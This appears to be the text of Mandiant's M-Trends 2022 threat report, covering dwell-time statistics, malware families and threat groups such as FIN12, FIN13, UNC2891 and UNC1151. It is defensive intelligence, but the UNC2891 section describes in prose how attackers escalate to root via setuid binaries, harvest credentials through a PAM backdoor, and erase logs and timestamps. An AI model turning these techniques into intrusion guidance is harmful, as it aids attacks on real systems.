SUMMARY
4
Recent cyber events are a stark reminder that our work as defenders is never done. Critical
vulnerabilities such as “Log4Shell” highlight the dangers of the unknown and the complexity of
patching. The supply chain is as attractive a target as ever, providing a potential entry point into
multiple vendors. And we must remain vigilant about protecting our industrial control systems,
especially given that 1 in 7 multifaceted extortion attacks leak critical operational technology
information.
Mandiant responders are on the frontlines every day, investigating and analyzing the latest
attacks and threats, and understanding how best to respond to and mitigate them. Everything
we learn is passed on to our customers through our various services, giving them a much-
needed advantage in a constantly evolving threat landscape.
Every year the M-Trends report provides some of that same critical intelligence to the greater
security community. M-Trends 2022 continues that tradition, offering details on the evolving
cyber landscape, mitigation recommendations, and a wide variety of security incident-related
metrics.
Let’s start with a win for defenders: the global median dwell time has continued its decline
in 2021. For intrusions investigated between October 1, 2020 through December 31, 2021, the
median number of days between compromise and detection was 21 days (down from 24 days in
2020). Although this may demonstrate improved visibility and response, the pervasiveness of
ransomware has helped drive this number down.
Ransomware and multifaceted extortion continue to be concerning. We highlight an increase
in targeting of virtualization infrastructure and offer mitigations. We also provide guidance on
ransomware preparedness (via red teaming) and recovery operations.
Other topics covered in M-Trends 2022 include:
By the Numbers The global median dwell time for intrusions identified by external third
parties and disclosed to the victims dropped to 28 days from 73 days in 2020, a stellar
improvement. In less desirable news, when the initial infection vector was identified, supply
chain compromise accounted for 17% of intrusions in 2021 compared to less than 1% in 2020.
Other signature metrics include detection by source, industry targeting, threat groups,
malware and attacker techniques.
Recently Graduated Threat Groups A detailed analysis of two financially motivated groups
we graduated in 2021: FIN12 and FIN13. We also highlight two noteworthy uncategorized
groups: UNC2891 and UNC1151.
Microsoft Exchange Case Study Our observations responding to more than 20 incidents
involving exploitation of on-premises Microsoft Exchange servers. In one testament to
dedicated investigation and analysis, the deployment of cryptocurrency coinminers by one
financially-motivated threat group led to the discovery of two nation-state actors in the same
environments.
China Cyber Operations We review China’s realignment and retooling, explore reemerging
espionage activity and highlight actors such as APT10 and APT41.
Misconfiguration Mitigations We observed various compromises due to misconfigurations
when using on-premises Active Directory with Azure Active Directory to achieve a single
integrated identity solution.
M-Trends 2022 builds on our transparency to continue providing critical knowledge to those
tasked with defending organizations. The information in this report has been sanitized to
protect identities of victims and their data.

Across the board, there was an increase in external notification of intrusions in
2021 compared to 2020. However, awareness of most intrusions continues to
come about through internal detections. The percentage of intrusions detected
internally has maintained a gradual upwards trend with moderate fluctuation over
the last six years.

In Americas, organizations detected intrusions internally in 60% of cases in
2021 compared to 61% of cases in 2020. There is relative stability in detection by
source trends for Americas from 2017 to 2021.
Organizations in APAC were notified by an external entity in 76% of intrusions in
2021 compared to 48% of intrusions in 2020. Observations for 2021 are in line with
observations for APAC from 2019. Mandiant experts have seen relatively large
shifts in detection by source metrics for APAC over the past five years.
In EMEA, organizations were notified of an incident by an external entity in 62%
of intrusions in 2021 compared to 47% of intrusions in 2020. Similar to APAC, when
analyzing the five-year trend, there remains variability in detection by source in
EMEA. The variability observed for both APAC and EMEA can be explained in part
by continued maturity of organizations’ security programs as well as external
entities’ notification ability in these regions.

Global Dwell Time
The global median dwell time for 2021 was 21 days compared to 24 days in 2020. This
13% improvement in global median dwell time was comprised of noteworthy changes
in relation to source of detection. The global median dwell time for incidents which
were identified externally dropped from 73 to 28 days. Conversely, incidents which
were identified internally saw a lengthening of global median dwell time from
12 to 18 days.
There were significant improvements to global median dwell time when an external
entity was the notification source. External entities are now detecting intrusions
and notifying organizations in less than a month—62% faster compared to 2020. This
speaks to improved detection capabilities of external entities in addition to more
established communications and outreach programs.
Mandiant experts observed a 50% increase in global median dwell time for internally
detected intrusions. The global median dwell time for internally detected intrusions
rose from 12 days in 2020 to 18 days in 2021. While median dwell time for internal
detections was slower compared to 2020, internal detections were still 36% faster
than external notifications.

Global Dwell Time Distribution
Global dwell time distribution continues to improve at both ends of the spectrum.
In 2021, 55% of investigations had dwell times of 30 days or fewer with 67% of these
(37% of total intrusions) being discovered in one week or less.
Mandiant experts observed a spike in dwell times between 90 and 300 days with
20% of investigations falling into this range. This could indicate intrusions going
undetected until more impactful actions occur in the environment following initial
infection and reconnaissance phases of the targeted attack lifecycle. This may also
highlight a disparity between organizational detection capabilities and the types of
attacks organizations face.
Fewer intrusions are going undetected for extensive periods of time. Only 8% of
intrusions investigated in 2021 had a dwell time of more than a year and half of these
(4% of total intrusions) had dwell times greater than 700 days.

Supply chain compromise was the second most prevalent initial infection vector
identified in 2021. When the initial infection vector was identified, supply chain
compromise accounted for 17% of intrusions in 2021 compared to less than 1% in

the SolarWinds breach and SUNBURST.¹
In 2021, Mandiant experts observed an uptick in intrusions with an initial infection
vector due to a prior compromise. These intrusions include handoffs from one group
to another and prior malware infections. Prior compromises accounted for 14% of
intrusions where the initial infection vector was identified.
Mandiant experts observed far fewer intrusions initiated via phishing in 2021.
When the initial compromise was identified, phishing was the vector in only 11% of
intrusions in 2021 compared to 23% in 2020. This speaks to organizations’ ability
to better detect and block phishing emails as well as enhanced security training of
employees to recognize and report phishing attempts.

Compromised Architecture and Insider Threat
In 2021 Mandiant experts observed a slight uptick in compromises that
likely served only to compromise architecture for further attacks. In
2021, this activity was identified in 4% of intrusions, a 1-percentage point
increase compared to 2020. Likewise, insider threat continues to be rare
with only 1% of intrusions investigated by Mandiant related to insider

In 2021, Mandiant experts identified that a quarter of victim environments had more
than one distinct threat group. These environments included investigations with
threat groups working together and attractive target environments enticing multiple
threat actors independently. While the percentage of victim environments with
multiple threat groups decreased in 2021 compared to 2020, the three-year trend

family. Further, use of BEACON across intrusions increased from 24% of intrusions
in 2020 to 28% in 2021. BEACON remains by far the favorite malware family among
adversaries and Mandiant expects its use will likely increase in the years to come.
SUNBURST¹² was observed in 9% of all intrusions investigated by Mandiant in 2021.
SUNBURST was delivered at scale to victim environments across the globe through a
malicious update, resulting in widespread compromised access. This metric is in line
with the observed relationship between the second most prevalent initial infection
vector, supply chain compromises and the use of SUNBURST in intrusions.
RYUK and LOCKBIT were the most used ransomware families during intrusions
investigated by Mandiant in 2021. Notably, newly graduated FIN12¹³ leveraged
RYUK, BEACON, SYSTEMBC and METASPLOIT to carry out some of the most prolific
intrusions seen throughout 2021. Ransomware families continue to contribute to the
malware family collection every year.
Adversaries continue to use a variety of malware to carry out missions. In 2021,
Mandiant observed just 3.8% of malware families being used in 10 or more intrusions
while 81% of malware families were observed in only one or two intrusions. Over
the years, Mandiant has observed adversary toolsets become more diverse
as adversaries continue to evolve. This diversification is demonstrated by a
continuation of limited retooling across intrusions.

Malware Definitions
BEACON is a backdoor that is commercially available as part of the Cobalt Strike
software platform and commonly used for penetration testing network environments.
The malware supports several capabilities, such as injecting and executing arbitrary
code, uploading and downloading files and executing shell commands. Mandiant has
seen BEACON used by a wide range of named threat groups including APT19, APT32,
APT40, APT41, FIN6, FIN7, FIN9, FIN11, FIN12 and FIN13, as well as nearly 650 UNC
groups.
SUNBURST is a .NET-based backdoor that initially communicates via DNS. SUNBURST
generates the domain of the initial remote server using a domain generation
algorithm. The DNS response returns a CNAME record containing the domain of the C2
server used for subsequent communication via HTTP. Supported backdoor commands
include file download and execution, file management, registry manipulation, and
process termination. SUNBURST can also disable targeted services to avoid detection
and upload basic system information that includes the system’s IP address, DHCP
configuration, and domain information. Mandiant has observed UNC2452 leverage
SUNBURST.¹⁴
METASPLOIT is a penetration testing platform that enables users to find, exploit, and
validate vulnerabilities. Mandiant has seen METASPLOIT used by APT40, APT41, FIN6,
FIN7, FIN11, FIN12, FIN13 and 40 UNC groups with end goals ranging from espionage
and financial gain to penetration testing.
SYSTEMBC is a tunneler written in C that retrieves proxy-related commands from a
C2 server using a custom binary protocol over TCP. A C2 server directs SYSTEMBC
to act as a proxy between the C2 server and a remote system. SYSTEMBC is also
capable of retrieving additional payloads via HTTP. Some variants may use the Tor
network for this purpose. Downloaded payloads may be written to disk or mapped
directly into memory prior to execution. SYSTEMBC is often used to hide network
traffic associated with other malware families. Observed families include DANABOT,
SMOKELOADER, and URSNIF. Mandiant has seen SYSTEMBC used by FIN12 and as
many as 10 UNC groups with goals related to financial gain.
LOCKBIT is ransomware written in C that encrypts files stored locally and on network
shares. LOCKBIT can also identify additional systems on a network and propagate
via SMB. Prior to encrypting files, LOCKBIT clears event logs, deletes volume shadow
copies and terminates processes and services that may impact its ability to encrypt
files. LOCKBIT has been observed using the file extension “.lockbit” for encrypted
files. Mandiant as seen LOCKBIT used by more than 10 UNC groups with goals relating
to financial gain and espionage.
RYUK is ransomware written in C that encrypts files stored on local drives and
network shares. It also deletes backup files and volume shadow copies. Some RYUK
variants can propagate to other systems on a network. Mandiant has seen RYUK used
by FIN6, FIN12 and 10 financially motivated UNC groups.

Threat Techniques
Mandiant remains committed to supporting community and industry efforts by
mapping its findings to the MITRE ATT&CK framework. In 2021, MITRE released
versions 9 and 10 of ATT&CK, which focused on advancement of MITRE’s coverage of
Linux, macOS and container techniques. Mandiant mapped 300+ additional Mandiant
techniques to the MITRE ATT&CK framework in 2021, bringing the total to 2100+
Mandiant techniques and subsequent findings associated with MITRE ATT&CK.
Organizations must prioritize which security measures to implement and the
likelihood of specific techniques being used during an intrusion should impact this
decision-making process. Examining the prevalence of technique usage during
recent intrusions, can better equip organizations to make intelligent security
decisions.

In 2021, Mandiant observed that more than half of the intrusions used obfuscation,
such as encryption or encoding, on files or information to make detection and
subsequent analysis more difficult (T1027).
Adversaries also continue to use a command or scripting interpreter to further
intrusions (T1059) and 65% of those cases (29% of all intrusions) involved the use of
PowerShell (T1059.001).
In 37% of investigations the adversary communicated using application layer
protocols (T1071) with 87% of those (32% of all investigations) specifically using web
protocols such as HTTP and HTTPS.
Mandiant experts observed adversaries perform discovery actions for system
information (T1082) in 32% of investigations and file or directory information
(T1083) also in 32% of investigations. Similarly, in 32% of investigations adversaries
removed indicators on a host (T1070) with 85% of these (27% of all investigations)
involving file deletions.
Similar to 2020, adversaries demonstrated a willingness to take advantage of
what is available in a victim’s environment to further intrusions in 2021. This is
particularly evident in how frequently adversaries used web protocols, PowerShell,
system services and Remote Desktop. Organizations must balance convenience
and accessibility of common technologies with security of environments.

Mandiant analysts review threat activity data from a variety of sources to identify
noteworthy clusters — such as Mandiant incident response engagements, Managed
Defense investigations, and security product telemetry. Initially, Mandiant reporting
may refer to these small clusters of activity by a generic description, such as
“Suspected Iranian espionage actors,” instead of a formal name. Over time, some
clusters will expand based on data obtained from emerging threat activity or
ongoing research that provides insight into the cluster’s tactics, techniques and
procedures (TTPs). When there is insufficient evidence to attribute the activity to
an existing threat actor or group immediately, Mandiant creates an uncategorized
(UNC) threat cluster to track the newly identified activity.
An UNC is a cluster of cyber activity that includes observable artifacts such as
adversary infrastructure, tools, and tradecraft. UNCs are based on a defining,
anchoring characteristic often discovered during a single incident. For example, a
common anchor would be a malware sample that connects to an actor-controlled
domain. While Mandiant reporting typically references specific UNCs, older articles
may use a temporary group name such as “TEMP.Reaper”.
As our knowledge of a threat cluster becomes sufficiently mature, we may conduct
a methodical, in-depth research project that culminates in assigning a formal
designation based on established Mandiant naming conventions. Advanced
persistent threat (APT) groups are generally focused on espionage activities
whereas financially motivated (FIN) groups are comprised of criminal actors that
monetize their operations via methods such as ransomware deployment, payment
card data theft and business email fraud.
In 2021, Mandiant promoted two attack groups from a previously tracked TEMP
group to FIN groups. We also announced a new UNC group of significant interest.

FIN12 PRIORITIZES
SPEED TO DEPLOY
RANSOMWARE AGAINST
HIGH-VALUE TARGETS
FIN12 is a financially motivated threat group behind prolific RYUK ransomware
attacks dating to at least October 2018. Mandiant’s definition of FIN12 is limited to
post-compromise activity because we have high confidence FIN12 relies on partners
to obtain initial access to victim environments. Instead of conducting data theft and
extortion, a tactic widely adopted by other ransomware threat actors, FIN12 appears
to prioritize speed. The lack of large-scale data exfiltration in FIN12 incidents has
almost certainly contributed to the group’s high cadence of operations. Between
September 2020 and September 2021, FIN12 intrusions comprised nearly 20 percent
of the ransomware incident response investigations performed by Mandiant.
Partnerships for Initial Access
While FIN12 appears to rely on close partnerships for obtaining initial access to
organizations, the group almost certainly has some input into victim selection. FIN12
has largely targeted high-revenue organizations. Unlike other ransomware threat
actors, the group has frequently targeted organizations in the healthcare sector.
While FIN12 has overwhelmingly targeted organizations located in North America,
evidence shows regional targeting expanding.
Historically, FIN12 has maintained a close partnership with TRICKBOT-affiliated
threat actors. All incidents involving FIN12 prior to March 2020 leveraged accesses
obtained from TRICKBOT infections. However, following a break in activity from
late March 2020 to late August 2020, FIN12 seemingly diversified its partnerships,
possibly seeking out other threat actors’ tools and services to increase the volume
and efficiency of their attacks. In September 2020, FIN12 shifted to accesses
obtained via BAZARLOADER infections Mandiant tracks as UNC2053. Mandiant
has observed numerous overlaps between UNC2053 and TRICKBOT operations,
including the use of common infrastructure, code signing certificates, droppers
and distributions TTPs. Mandiant believes BAZARLOADER and TRICKBOT were likely
developed under the direction of common threat actors.
In at least four FIN12 intrusions between February and April 2021, evidence
revealed malicious access to the targeted organization’s Citrix environment.
While investigations did not confirm how FIN12 obtained legitimate credentials
to the environment, it is plausible the threat actors relied on purchases from
underground forums.
In two separate FIN12 intrusions during May 2021, a threat actor obtained a foothold
in environments through malicious email campaigns distributed internally from
compromised user accounts. In both incidents, the threat actor used compromised
credentials to access the targeted organization’s Microsoft 365 environment. While
the distribution TTPs varied, both campaigns led to WEIRDLOOP and BEACON
payloads attributed to FIN12.
Increased Speed of Attacks
After acquiring access to victim environments, FIN12 deploys ransomware quickly.
In M-Trends 2021, the median dwell time for all ransomware investigations was five
days, whereas, across FIN12 engagements, dwell time was less than two days.
Mandiant has observed a significant year-over-year decrease in the amount of time
between initial access and the deployment of ransomware by FIN12. Most of the
RYUK incidents Mandiant has responded to are attributed to FIN12, but we assess
the ransomware is not exclusive to the group. FIN12 has almost exclusively deployed
RYUK ransomware. However, in one instance, FIN12 deployed CONTI ransomware
and extorted the organization under threat of releasing stolen data.

Mandiant has observed FIN12 use a broad toolset that included the Powershell-based
EMPIRE framework and the TRICKBOT banking Trojan. However, since February
2020, FIN12 has used Cobalt Strike BEACON payloads in nearly every one of its
intrusions, from internal reconnaissance to ransomware deployment.
Regional Expansion of Attacks
Mandiant expects that FIN12’s regional targeting will continue to broaden. There
has been significant attention from the U.S. government on ransomware threats
in 2021. Various efforts have been made to curtail the threat, including sanctions
and the threat of future sanctions against threat actors deploying ransomware and
services used by these actors to facilitate financial transactions. The elevated level
of negative attention may make U.S.-based organizations a less desirable target
for FIN12, which means it may shift its attention to organizations operating in other
areas of the world, including nations in Western Europe and the Asia-Pacific region.

FIN13 PRIORITIZES TARGETS
BASED IN MEXICO
Active since at least 2016, FIN13 is a financially motivated threat group that targets
organizations based in Mexico. The group has monetized its intrusions by collecting
information required to conduct fraudulent financial transfers. Mandiant believes
FIN13 has gained access to victim organizations by exploiting vulnerabilities in
public-facing web servers and popular tools and malware that are at least partially
based on publicly available code. However, the threat group has also demonstrated
the capability to deploy small custom tools and utilities crafted to support specific
objectives in targeted environments. FIN13 is further characterized by its extensive
use of web shells and other passive backdoors across various stages of the attack
lifecycle.
Extended Dwell Times and Evolving TTPs
Unlike many financially motivated threat actors tracked by Mandiant, FIN13 has
often maintained presence in victim environments for durations up to several years.
Due to this extended access, Mandiant has been able to observe the group’s TTPs
evolve over time, even within individual environments. Notable changes in TTPs have
included a shift from the near-exclusive use of traditional web shells to BLUEAGAVE,
a PowerShell or Perl-based passive backdoor. FIN13 has also made regular updates
to the file encoding used to obfuscate not only their tools, scripts and malware but
also the data they steal.
Unique Monetization Strategy
FIN13 monetizes its operations with schemes directly enabled via data theft. The
group often steals financial data or files related to a company’s point-of-sale (POS)
systems, ATMs and general financial transaction processing systems. FIN13 also
appears to adapt its end-stage operations to each victim’s unique environment.
In at least one incident, the threat actors deployed custom malware that Mandiant
tracks as GASCAN, which processes POS card and transaction data structured in a
format likely used to generate fraudulent financial transactions. FIN13 intrusions
targeting retailers have sometimes led to the theft of payment card data, but rather
than collect this data to sell on underground markets, evidence suggests it has been
used to generate fraudulent transfers of funds into attacker-controlled accounts.
This approach is relatively unique; many actors who target POS systems focus their
operations on obtaining and selling credit card data.

actors who are more broadly opportunistic. However, regional targeting has
been historically more common within Latin American cyber crime communities.
For example, Mandiant has previously reported on Brazilian threat actors who
historically focused on targeting Brazil-based individuals and organizations. We
began to observe a significant expansion in that group’s targeting beginning in 2018,
which was likely due to its increasing sophistication and developing relationships
with other cyber criminals. It is plausible that FIN13 operations will follow a similar
pattern. As the threat actor’s tradecraft improves and organizations based in
Mexico develop more mature security programs, it is likely FIN13 will begin to target
organizations in other parts of the world.
SPECIAL REPORT | MANDIANT M-TRENDS 2022 49
GRASPING THE
COMPLEXITY OF UNC2891
In 2021, Mandiant responded to a series of incidents that targeted financial
organizations in the Asia Pacific region. During these investigations, Mandiant
identified a threat group that demonstrated unusual skillsets. This group, which
Mandiant tracks internally as UNC2891, possesses a fluency and expertise in
targeting Unix and Linux based systems for objectives which appear to be financially
motivated. UNC2891 maintains an arsenal of malware and tooling to move through
environments easily and limit forensic evidence trails on impacted endpoints.
Overall, UNC2891 demonstrates the attributes of a skilled adversary with the ability
to gain a deep understanding of the systems they target and make extensive use
of publicly available tools which they customize, compile and package for different
operating systems. Similarly, Mandiant has observed evidence to indicate UNC2891
has a complex understanding of operational security and applied several techniques
to hide their presence and hinder response efforts.
SUN4ME
Mandiant identified evidence that UNC2891 used an expansive attacker toolkit called
SUN4ME. SUN4ME is a self-contained ELF binary with over a hundred commands
that aid the operator in all stages of the attack lifecycle. SUN4ME capabilities
support network reconnaissance, host enumeration, exploitation of common
vulnerabilities and anti-forensics measures, along with common shell utilities. The
exact origins of SUN4ME are not well understood. However, based on investigations
where UNC2891 was identified, SUN4ME capabilities were a primary enabler for that
actor’s operations. The compiled nature of SUN4ME combined with its extensive
set of supported functions provided UNC2891 with both flexibile deployment and
consistent performance. Where production environments might restrict foreign
package installations or alert network defenders to their presence, a compiled
binary could be moved from endpoint to endpoint with relative ease. UNC2891 could
depend on SUN4ME’s broad set of tools without worrying about dependency issues
commonly experienced across disparate sets of Linux and Unix-based operating
systems.
Several of the commands in SUN4ME are publicly available tools or scripts also
present in various offensive distributions or frameworks. However, Mandiant
identified custom tooling built into SUN4ME, including exploits for remote code
execution vulnerabilities in Oracle WebLogic and Veritas NetBackup software.
SUN4ME also includes a demo command that contains sixteen different ASCII
terminal animations along with extensive help dialogs for supported features. The
help dialogs are provided in fluent English, suggesting the developer may be English
speaking.
UNC2891 used sshock, an SSH brute forcing tool bundled within SUNME, as a means
of initial access into the environments of targeted organizations. The sshock tool
supports the use of wordlist credentials, parallel scanning of targets and the ability
to collect SSH keys from targeted systems after gaining access to them. These
features enabled UNC2891 to run commands as well as upload, run, and delete files
SPECIAL REPORT | MANDIANT M-TRENDS 2022 50
automatically after a system was compromised. Mandiant identified evidence to
indicate UNC2891 performed reconnaissance in compromised environments to
supplement the embedded credential lists provided with sshock. The automated
nature of some sshock features helped the attacker spread through an environment.
After UNC2891 successfully compromised an environment, SUN4ME and sshock
facilitated movement through the targeted environment by deploying additional
malware and backdoors.

STEEL Family of In-Memory Droppers
In every case where Mandiant recovered variants of SUN4ME, it had been loaded
through an in-memory dropper Mandiant tracks as STEELCORGI. While in-memory
droppers are not terribly unique even in Unix and Linux-based environments,
STEELCORGI used techniques that were apparently designed to limit both detection
and broad-scale identification of how it operated. STEELCORGI droppers decrypt
an embedded payload based on a configurable behavior flag and environment
variables obtained at runtime but also take steps to obfuscate the environment
variables they would access. During investigations where active malware that
leverages environment variables is suspected, analysts usually identify the source
environment variable and enumerate the instances of that environment variable
within the network. The presence of the environment variable effectively acts as an
indicator of compromise and allows analysts to narrow down suspect endpoints and
prioritize them for deep dive analysis. STEELCORGI was designed to frustrate these
efforts by enumerating environment variables by the SHA256 hash of the variable
name, limiting the ability to identify the environment variable from malware analysis
alone. Without the specific key used by STEELCORGI, decryption of the payloads was
impossible.
While some variants of STEELCORGI frustrated analysis and detection efforts, a
more recent sample of STEELCORGI presented avenues for decryption of payloads.
One sample derived the decryption key from multiple pieces of information culled
from the target endpoint. When an endpoint or its hardware information was
available, Mandiant was able to decrypt payloads embedded within these versions of
STEELCORGI. Mandiant has also observed UNC2891 use an in-memory dropper with
functionality similar to STEELCORGI, except that it enumerates keys through an MD5
hash of environment variables and includes the functionality to create new versions
of itself with different payloads. Mandiant tracks this variant as STEELHOUND.
Notable Tactics, Techniques and Procedures
Soon after gaining root-level access to a targeted endpoint, UNC2891 would set
the setuid and setgid bits on legitimate executables owned by root. The setuid and
setgid bits allow a non-privileged user to run the file under the context of the owner;
in this case root. This allowed UNC2891 to maintain root-level command access on
a system without needing to elevate permissions or impersonate a privileged user.
A common example observed by Mandiant during investigations into UNC2891 was
to set the setuid and setgid bits on the Unix time program. This allowed UNC2891 to
proxy commands as an argument to time resulting in the commands being executed
as the root user.
During lateral movement and internal reconnaissance activity, UNC2891 often used
an extensive shell script that performed network and endpoint reconnaissance,
including the collection of running processes, session information and SSH known
hosts and keys. It also made copies of credential files such as /etc/shadow and /etc/
passwd. UNC2891 would often create a new directory to stage the output of these
scripts; the attacker would then compress and encode them using a uuencoding
scheme. While uuencode is an uncommon encoding scheme for attackers, UNC2891
used it extensively along with a set of Perl scripts (bundled in SUN4ME) to facilitate
the encoding and decoding of files.
In most cases, UNC2891 would immediately install a backdoor that Mandiant
tracks as SLAPSTICK on compromised endpoints. SLAPSTICK is a Linux Pluggable
Authentication Module (PAM) based backdoor that provides access to a system with
SPECIAL REPORT | MANDIANT M-TRENDS 2022 52
a hardcoded password. During installation, the original Linux PAM authentication
module is renamed and the malicious SLAPSTICK module takes its place, effectively
hooking the PAM authentication process. This also allows SLAPSTICK to capture
plaintext credentials of user logins which it subsequently writes to an encrypted
file on disk. Variants of SLAPSTICK support basic commands, such as the ability
remove itself from an endpoint, create outbound connections or spawn a shell with
the HISTFILE unset. SLAPSTICK’s ability to provide stealthy backdoor access to
endpoints along with credential harvesting functionality drove much of the lateral
movement observed for UNC2891 and remained a primary way for the attacker to
access compromised endpoints. Analysis of a functioning installer for SLAPSTICK
revealed that, much like SUN4ME, SLAPSTICK appears to be reliable and well-
designed, with useful help dialogs and console logging.
After establishing a foothold and moving laterally throughout a targeted
environment, UNC2891 deployed custom variants of the publicly available
TINYSHELL backdoor. The TINYSHELL variants used by UNC2891 were configured
to communicate with external command-and-control (C2) servers that were read
from an encoded file on disk. Analysis of the TINYSHELL backdoors and associated
configuration files provided insight into UNC2891’s C2 infrastructure. TINYSHELL
deployments were limited to critical endpoints within the environment and each
instance was configured to communicate with a unique dynamic DNS domain based
on the hostname or general role of the compromised endpoint. Mandiant suspects
UNC2891 only enabled DNS resolution for these domains during limited operational
windows when external access was required. As a result, no passive DNS data has
been recovered for the observed external C2 domains. The use of dynamic DNS as
a C2 mechanism is not uncommon. However, the combination of individual domains
for each host and the limited time during which the domains were configured for
resolution speaks to UNC2891’s degree of operational security and understanding of
incident response practices.
Evading Detection and Hindering Analysis
Analysis of Windows endpoints differs dramatically from similar analysis of Linux
or Unix-based endpoints. Much of the flexibility inherent to Unix-based operating
systems, which developers and administrators find valuable, limit the confidence
of analysis which can be performed. The limitations often result in an over-reliance
on log files generated by the operating system and an opportunity for attackers to
minimize the artifacts they leave behind during a campaign. UNC2891 exploited such
limitations with tools which were bundled with SUN4ME.
The bleach tool, which Mandiant tracks internally as LOGBLEACH, removes log
entries from several Unix and Linux log files by matching against filters provided
at the command line, such as username, IP address, hostname or even a window
of time in which entries were generated. LOGBLEACH also includes the ability to
manipulate the lastlog binary file, which tracks the last login time for each account,
by either removing or falsifying the information within the file. UNC2891 deploys log-
clearing tools specific to the version of the targeted operating system. For example,
a tool similar to LOGBLEACH, which Mandiant tracks as WIPERIGHT, was often used
to alter log data on Oracle Solaris SunOS systems with SPARC based architecture.
UNC2891 would often pair log manipulation with actions that limited forensic analysis
of the associated file system. In multiple cases, Mandiant identified evidence to
indicate UNC2891 altered timestamps associated with malware files on targeted
machines—a technique commonly called timestomping. Where timestomping is
moderately difficult on the NTFS-based filesystems used in Windows due to the
SPECIAL REPORT | MANDIANT M-TRENDS 2022 53
Master File Table (MFT) and the attributes associated with each entry, manipulating
the timestamps of files on a Unix-based endpoint is often a trivial exercise. The
combination of timestomping and log file manipulation casts an operating system as
an unreliable narrator in the eyes of analysts, raising the bar required for thorough
analysis and potentially slowing the pace of a broad scale investigation.
While UNC2891 used multiple technical anti-forensic methodologies, they didn’t rely
solely on technical solutions. To further obfuscate UNC2891 malware and tools, the
attacker would often maintain naming conventions and locations for files commonly
seen on the specific operating system. For example, UNC2891 was observed
using file naming schemes for malware which matched the common naming
convention for shared libraries within Linux and maintained fairly strict operational
security by placing those files in the same default directories. UNC2891 also
maintained persistence for backdoors by using a systemd service unit file themed
to masquerade as a legitimate service such as systemd, the name cache daemon
(ncsd), and the at daemon (atd). However, this combination of operational security
and technical acumen paled in comparison to the malicious kernel rootkit used by
UNC2891 and tracked by Mandiant as CAKETAP.
CAKETAP hooks several system networking API calls to filter out the presence of IP
addresses and ports being used by the attacker backdoors. This filtering effectively
prevents network-related system commands such as netstat from displaying the
malware C2 connections. Additional file system API hooks installed by CAKETAP
are used to provide a communication channel and configuration mechanism for the
rootkit. CAKETAP looks for the existence of secrets in the filenames returned by
the hooked functions and uses this as a signal to receive commands. This feature
allowed UNC2891 to configure and control CAKETAP through existing backdoor
access to compromised servers by issuing shell commands that use the hooked
system calls. A variant of CAKETAP was discovered which Mandiant believes
was intended to manipulate network traffic transiting a victim’s automated teller
machine (ATM) switching network and potentially used as part of a larger operation
to perform unauthorized cash withdrawals using fraudulent bank cards.
Nexus to UNC1945
Through in-depth analysis of intrusion data collected during investigations
attributed to UNC2891, Mandiant has discovered significant overlap with
UNC1945, a group that has been publicly reported as LightBasin. Both groups have
demonstrated their preference and expertise in targeting and operating from Linux
and Unix-based endpoints. The overlaps observed span several attribution aspects
but mostly focus on the usage of the same or similar malware families unique to both
groups, as well as unique TTPs and general tradecraft.
Mandiant has identified SUN4ME, along with variants of bundled tools, being used by
UNC1945 across several intrusions. During these investigations, Mandiant obtained
several versions of SUN4ME, including the same STEELCORGI packaged variant
observed in use by UNC2891. Considering UNC2891’s predilection for bundled tools
such as SUN4ME, UNC1945 has been observed deploying pre-loaded custom QEMU
virtual machines containing a similar set of preloaded tools and scripts. Mandiant
has observed both actors deploy STEELCORGI droppers that load malware families
other than SUN4ME. UNC1945 has been observed deploying LOGBLEACH as well as a
previously unknown passive backdoor through STEELCORGI. Other notable overlaps
include the use of TINYSHELL and the PAM-based backdoor SLAPSTICK by both
groups, as well as similar staging directories and files used to store command line
output.
SPECIAL REPORT | MANDIANT M-TRENDS 2022 54
Despite significant overlaps between the two groups, Mandiant has not currently
determined these threat clusters are attributable to the same actor due in large
part to a perceived difference in motivations. Whereas UNC2891 has primarily been
observed targeting financial organizations in the Asia-Pacific region, UNC1945
intrusions have spanned several years during which the attacker compromised
victims in the managed service and telecom provider industries. At the time
of writing, while Mandiant does not have evidence to indicate the objectives of
UNC1945, espionage operations may be the likely motivator. Mandiant continues to
track UNC2891 and UNC1945 as distinct clusters of activity.
Conclusion
UNC2891 executes their operations systematically while maintaining a high level of
operational security and employing several techniques to evade discovery. While
the technical and operational acumen UNC2891 can bring to bear has served to keep
them well hidden, the limitations on detection and forensics for Linux and Unix-
based operating systems also facilitate their stealth. UNC2891 uses their expertise
with these systems to take full advantage of the decreased visibility and capitalize
on the broad appeal of such systems in production environments. Good endpoint
instrumentation and a comprehensive logging policy which directs logs out of the
reach of potential attackers are likely candidates for security improvements that can
inhibit the ability of UNC2891 and similar groups to remain hidden.

UNC1151 AND GHOSTWRITER
LINKED TO BELARUSIAN
INTERESTS
UNC1151 is a cluster of activity Mandiant believes is linked to the Belarusian
government, based on technical and geopolitical indicators. In April 2021, we
released a public report detailing our high-confidence assessment that UNC1151
provides technical support to the Ghostwriter information operations campaign.
This assessment, along with observed Ghostwriter narratives consistent with
Belarusian government interests, indicates a possibility that Belarus is also likely at
least partially responsible for the Ghostwriter campaign. While we cannot rule out
Russian contributions to either UNC1151 or Ghostwriter, Mandiant has not uncovered
direct evidence of such contributions.
Constrained Objectives and Targeting Scope
UNC1151 has targeted a wide variety of governmental and private sector entities,
with a focus in Ukraine, Lithuania, Latvia, Poland and Germany. The targeting
also includes Belarusian dissidents, media entities and journalists. While multiple
intelligence services are interested in these countries, the scope of targets is
most consistent with Belarusian interests. Also, UNC1151 operations have focused
on obtaining confidential information and no monetization efforts have been
uncovered.
Anti-NATO Sentiments
From the earliest observed Ghostwriter operation until mid-2020, the Ghostwriter
campaign primarily promoted anti-NATO narratives that appeared intended to
undercut regional security cooperation in operations targeting Lithuania, Latvia
and Poland. Observed operations have disseminated disinformation portraying
the foreign troop presence in the region as a threat to residents and alleging that
the costs of NATO membership are a detriment to local populations. The seeming
intended effect of these narratives—to erode regional support for NATO—can serve
both Russian and Belarusian interests. However, the campaign has specifically
targeted audiences in countries bordering Belarus, whereas Russia has long
promoted anti-NATO narratives both in the region and further afield. Observed
Ghostwriter operations through the present time have almost completely excluded
Estonia, which notably does not border Belarus but is a Baltic State, NATO member
and a relevant component of any concerns regarding NATO’s security posture on its
eastern flank.
Further Alignments and Non-Alignments
Mandiant has tracked UNC1151 since 2017 and observed no overlaps with other
tracked Russian groups, including APT28, APT29, Turla, Sandworm and TEMP.
Armageddon. While we cannot rule out Russian support for or involvement in
UNC1151 or Ghostwriter operations, the TTPs used by UNC1151 are unique.
Since the disputed August 2020 elections in Belarus, Ghostwriter operations have
been more distinctly aligned with Minsk’s interests. Promoted narratives have
focused on alleging corruption or scandal within the ruling parties in Lithuania
